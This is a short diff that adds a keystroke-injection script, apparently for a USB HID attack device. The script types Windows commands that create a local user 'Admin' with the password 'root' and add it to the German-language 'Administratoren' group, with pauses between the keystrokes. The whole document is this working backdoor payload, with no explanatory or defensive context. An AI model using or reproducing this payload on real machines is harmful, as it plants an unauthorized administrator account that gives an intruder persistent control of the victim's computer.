@@ -1,0 +1,6 @@
+ALTSTRING Net user Admin root /add
+ENTER
+DELAY 1500
+ALTSTRING net localgroup Administratoren Admin /add
+ENTER
+DELAY 1000
